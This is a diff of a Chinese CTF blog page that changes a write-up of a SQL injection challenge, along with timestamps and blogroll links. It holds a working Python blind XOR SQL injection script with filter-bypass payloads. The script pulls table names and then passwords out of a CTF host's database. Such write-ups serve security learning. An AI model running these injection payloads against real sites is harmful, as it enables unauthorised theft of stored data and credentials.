@@ -82,13 +82,13 @@
 
 
 
-<meta name="description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 12345678910111213141516171819202122232425262728293031323334353637import reques">
+<meta name="description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 1234567891011121314151617181920212223242526import requestsimport stringurl = &quot;">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/SQL题型记录/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 12345678910111213141516171819202122232425262728293031323334353637import reques">
+<meta property="og:description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 1234567891011121314151617181920212223242526import requestsimport stringurl = &quot;">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png">
@@ -105,10 +105,10 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58558693-12748280-8254-11e9-8acb-ba824cb791cd.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png">
-<meta property="og:updated_time" content="2019-12-18T13:34:03.971Z">
+<meta property="og:updated_time" content="2019-12-19T02:45:59.961Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL 题型记录[working forever]">
-<meta name="twitter:description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 12345678910111213141516171819202122232425262728293031323334353637import reques">
+<meta name="twitter:description" content="极客大挑战 Final SQL 过滤了很多, 然后在id处测出了异或注入. 过滤了空格和星号, 用括号绕过, 然后注, 读flag表:  怎么这么多垃圾数据? 倒过来读一下看吧  👴哭了 去读另一张表了, 这次还是从最后一位往前读  脚本: 1234567891011121314151617181920212223242526import requestsimport stringurl = &quot;">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png">
 
 
@@ -349,8 +349,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-18T21:34:03+08:00">
-                2019-12-18
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-19T10:45:59+08:00">
+                2019-12-19
               </time>
             
           </span>
@@ -446,7 +446,7 @@
 <p>去读另一张表了, 这次还是从最后一位往前读</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/71090386-de57b380-21dd-11ea-8bcb-220f4ffbaf93.png" alt="image"></p>
 <p>脚本:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database()))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#  url = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('Flaaaaag'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#  url_tmp = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('F1naI1y'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))".format(index, m_bound)</span></span><br><span class="line">        url_tmp = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  url_tmp = url.format(index, m_bound)</span></span><br><span class="line">        res = requests.get(url_tmp).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> res:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">    result = chr(tmp) + result</span><br><span class="line">    print(result)</span><br><span class="line">    index -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  for i in range(1, 20):</span></span><br><span class="line">    <span class="comment">#  for j in range(32, 128):</span></span><br><span class="line">        <span class="comment">#  url_tmp = url.format(i, j)</span></span><br><span class="line">        <span class="comment">#  #  print(url_tmp)</span></span><br><span class="line">        <span class="comment">#  res = requests.get(url_tmp).content</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#  if 'ERROR' in res:</span></span><br><span class="line">            <span class="comment">#  result += chr(j)</span></span><br><span class="line">            <span class="comment">#  print(result)</span></span><br><span class="line">            <span class="comment">#  break</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database()))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#  url = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('Flaaaaag'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#  url_tmp = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('F1naI1y'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))".format(index, m_bound)</span></span><br><span class="line">        url_tmp = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  url_tmp = url.format(index, m_bound)</span></span><br><span class="line">        res = requests.get(url_tmp).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> res:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">    result = chr(tmp) + result</span><br><span class="line">    print(result)</span><br><span class="line">    index -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h2 id="XDCTF-2015-filemanager">XDCTF  2015 filemanager</h2>
 <p>提供了文件上传, 删除和改名的功能, 有源码泄露, 删除功能没什么用, 其他关键代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// common.inc.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>($_GET, $_POST, $_COOKIE) <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -740,76 +740,16 @@
             <div class="links-of-blogroll motion-element links-of-blogroll-block">
               <div class="links-of-blogroll-title">
                 <i class="fa  fa-fw fa-link"></i>
-                参考链接
+                友链
               </div>
               <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.leavesongs.com/" title="p神" target="_blank">p神</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.k0rz3n.com/" title="k0rz3n" target="_blank">k0rz3n</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://lorexxar.cn/" title="lorexxar" target="_blank">lorexxar</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.smi1e.top/" title="smi1e" target="_blank">smi1e</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.xmsec.cc/tag/ctf/" title="xmsec" target="_blank">xmsec</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://err0rzz.github.io/" title="Err0rzz" target="_blank">Err0rzz</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://altman.vip/" title="altman" target="_blank">altman</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://pplsec.github.io" title="pplsec" target="_blank">pplsec</a>
-                  </li>
                 
                   <li class="links-of-blogroll-item">
                     <a href="https://yml-sec.top/" title="YeMoLi" target="_blank">YeMoLi</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://hellohxk.com/" title="empty_xl" target="_blank">empty_xl</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://www.zyzilxy.top:1220/#" title="Innofit" target="_blank">Innofit</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
                     <a href="https://althims.com" title="Moyu" target="_blank">Moyu</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.xiafeng2333.top" title="xiafeng" target="_blank">xiafeng</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://www.rai4over.cn/#" title="rai4over" target="_blank">rai4over</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
